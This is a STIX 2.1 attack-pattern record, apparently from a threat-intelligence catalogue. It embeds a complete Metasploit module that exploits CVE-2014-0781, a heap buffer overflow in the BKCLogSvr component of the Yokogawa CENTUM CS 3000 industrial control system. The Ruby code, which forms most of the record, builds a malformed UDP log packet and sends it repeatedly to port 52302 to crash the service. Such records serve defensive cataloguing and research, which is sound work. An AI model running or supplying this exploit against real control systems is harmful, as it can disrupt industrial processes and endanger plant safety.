{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7300c13a-a576-43c3-81e4-f2462145122d",
    "created": "2024-08-14T16:24:42.225005Z",
    "modified": "2024-08-14T16:24:42.22501Z",
    "name": "Yokogawa CENTUM CS 3000 BKCLogSvr.exe Heap Buffer Overflow",
    "description": " This module abuses a buffer overflow vulnerability to trigger a Denial of Service of the BKCLogSvr component in the Yokogaca CENTUM CS 3000 product. The vulnerability exists in the handling of malformed log packets, with an unexpected long level field. The root cause of the vulnerability is a combination of usage of uninitialized memory from the stack and a dangerous string copy. This module has been tested successfully on Yokogawa CENTUM CS 3000 R3.08.50. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/scada/yokogawa_logsvr.rb",
            "external_id": "yokogawa_logsvr.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.yokogawa.com/dcs/security/ysar/YSAR-14-0001E.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2014/03/10/yokogawa-centum-cs3000-vulnerabilities/"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0781"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Udp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Yokogawa CENTUM CS 3000 BKCLogSvr.exe Heap Buffer Overflow',\n      'Description'    => %q{\n        This module abuses a buffer overflow vulnerability to trigger a Denial of Service\n        of the BKCLogSvr component in the Yokogaca CENTUM CS 3000 product. The vulnerability\n        exists in the handling of malformed log packets, with an unexpected long level field.\n        The root cause of the vulnerability is a combination of usage of uninitialized memory\n        from the stack and a dangerous string copy. This module has been tested successfully\n        on Yokogawa CENTUM CS 3000 R3.08.50.\n      },\n      'Author'         =>\n        [\n          'juan vazquez',\n          'Redsadic <julian.vilas[at]gmail.com>'\n        ],\n      'References'     =>\n        [\n          [ 'URL', 'http://www.yokogawa.com/dcs/security/ysar/YSAR-14-0001E.pdf' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2014/03/10/yokogawa-centum-cs3000-vulnerabilities/' ],\n          [ 'CVE', '2014-0781']\n        ],\n      'DisclosureDate' => '2014-03-10',\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(52302),\n        OptInt.new('RLIMIT', [true,  \"Number of packets to send\", 10])\n      ])\n  end\n\n  def run\n    if datastore['RLIMIT'] < 2\n      print_error(\"Two consecutive packets are needed to trigger the DoS condition. Please increment RLIMIT.\")\n      return\n    end\n\n    # Crash due to read bad memory\n    test = [1024].pack(\"V\")             # packet length\n    test << \"AAAA\"                      # Unknown\n    test << \"SOURCE\\x00\\x00\"            # Source\n    test << \"\\x00\" * 8                  # Padding\n    test << \"B\" * (1024 - test.length)  # Level & Message coalesced\n\n    connect_udp\n\n    # Sending two consecutives packages is enough to\n    # trigger the overflow and cause the DoS. But if\n    # legit packets are processed by the server, between\n    # the two malformed packages, overflow won't happen.\n    # Unfortunately because of the usage of UDP and the\n    # absence of answer, there isn't a reliable way to\n    # check if the DoS condition has been triggered.\n    print_status(\"Sending #{datastore['RLIMIT']} packets...\")\n    (1..datastore['RLIMIT']).each do |i|\n      vprint_status(\"Sending #{i}/#{datastore['RLIMIT']}...\")\n      udp_sock.put(test)\n    end\n\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-03-10"
}